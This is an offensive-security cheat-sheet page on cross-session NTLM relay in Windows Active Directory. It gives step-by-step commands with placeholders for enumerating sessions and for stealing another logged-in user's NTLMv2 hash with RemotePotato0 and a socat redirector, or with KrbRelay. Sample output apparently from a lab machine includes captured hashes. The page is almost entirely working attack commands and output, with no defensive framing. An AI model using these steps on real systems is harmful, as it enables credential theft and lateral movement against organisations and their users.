---
title: "Cross Session Relay"
date: 2025-7-25
tags: ["Ntlm", "Pass-The-Hash", "Authentication", "Cross Session Relay", "Active Directory", "Windows", "Krbrelay", "Remotepotato0"]
---

### Display Information about the Session Host

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
qwinsta *
```

```console
# Or runas
.\RunasCs.exe x x qwinsta -l 9
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe x x qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

{{< /tabcontent >}}

---

### Abuse #1: Steal NTLM Hash

{{< tab set2 tab1 >}}RemotePotato0{{< /tab >}}
{{< tab set2 tab2 >}}KrbRelay{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Redirect Auth Request Back to Target

```console
# In local Linux 
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET>:<RELAY_PORT>
```

```console {class="sample-code"}
$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
```

#### 2. Trigger Auth Request

```console
.\RemotePotato0.exe -m 2 -s <TARGET_SESSION_ID> -x <LOCAL_IP> -p <RELAY_PORT>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.31 -p 9999
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:c85c8b06ea8cbf94:f0903535db0e745638f0a22546baca39:010100000000000078e462474f0ddb01bb8e369fa1e4686d0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e006800740062000700080078e462474f0ddb0106000400060000000800300030000000000000000100000000200000222be9703dcb830eda784e33f597391b2c7cf7f0fb411ed5f2648c010cc425380a00100000000000000000000000000000000000090000000000000000000000
```

<small>*Ref: [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. All-in-One

```console
.\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm
```

```console
# Or runas
.\RunasCs.exe x x -l 9 ".\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe x x -l 9 ".\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"

[*] Auth Context: rebound\tbrady
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Users\winrm_svc\Documents\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABJGQyAi8LMIBN+MAhuikSwAqQAADQK//+wxuEhSQRAQSIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing cross-session authentication
[*] Using CLSID: 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4
[*] Spawning in session 1
[*] NTLM1
4e544c4d535350000100000097b218e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44
[*] NTLM2
4e544c4d53535000020000000e000e003800000015c299e2880ac12a024196ae000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008004add1d1a500ddb010000000000000000000000005c00410070007000490044005c004b00000000000b000000
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons
[*] NTLM3
tbrady::rebound:880ac12a024196ae:29076f3e6bee3f24005514327ad69c6e:01010000000000004add1d1a500ddb017e83c8219443d0d30000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008004add1d1a500ddb0106000400060000000800300030000000000000000100000000200000222be9703dcb830eda784e33f597391b2c7cf7f0fb411ed5f2648c010cc425380a00100000000000000000000000000000000000090000000000000000000000
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)
   at KrbRelay.Program.Main(String[] args)
```

<small>*Ref: [KrbRelay](https://github.com/cube0x0/KrbRelay)*</small>

{{< /tabcontent >}}
